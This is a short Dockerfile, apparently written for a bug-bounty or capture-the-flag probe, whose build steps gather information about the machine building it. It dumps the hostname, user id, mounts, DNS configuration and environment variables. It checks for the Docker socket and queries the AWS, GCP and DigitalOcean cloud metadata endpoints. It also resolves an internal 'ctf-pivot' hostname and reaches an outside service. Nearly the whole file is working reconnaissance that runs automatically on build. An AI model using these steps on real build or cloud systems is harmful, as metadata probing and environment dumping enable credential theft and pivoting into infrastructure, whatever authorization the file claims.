FROM alpine:3.20
RUN echo "=== BUILD NODE RECON (authorized bounty probe) ===" \
 && cat /etc/hostname && id \
 && echo "--- mounts ---" && head -6 /proc/mounts \
 && echo "--- resolv ---" && head -4 /etc/resolv.conf \
 && echo "--- env (filtered) ---" && env | grep -viE 'github|token|password|secret' | head -25
RUN echo "--- sock check ---" && (ls -la /var/run/docker.sock 2>&1 || true) \
 && echo "--- DO metadata ---" && (wget -q -T 3 -O - http://169.254.169.254/metadata/v1/ 2>&1 | head -6 || echo DO-METADATA-FAIL) \
 && echo "--- GCP metadata ---" && (wget -q -T 3 -O - --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/ 2>&1 | head -6 || echo GCP-METADATA-FAIL) \
 && echo "--- AWS metadata ---" && (wget -q -T 3 -O - http://169.254.169.254/latest/meta-data/ 2>&1 | head -4 || echo AWS-METADATA-FAIL)
RUN echo "--- dns internal ---" \
 && (nslookup kconn-1-ctf-pivot2.k.aivencloud.com 2>&1 | tail -3 || true) \
 && echo "--- public svc reach ---" \
 && (wget -q -T 3 -O - --no-check-certificate https://01a0e590-a86c-7872-b807-705fe6704b1a-8080.amer-1.aiven.app/ 2>&1 | head -3 || echo VEHICLE-UNREACH) \
 && echo "=== RECON DONE ==="
CMD ["sleep", "5"]
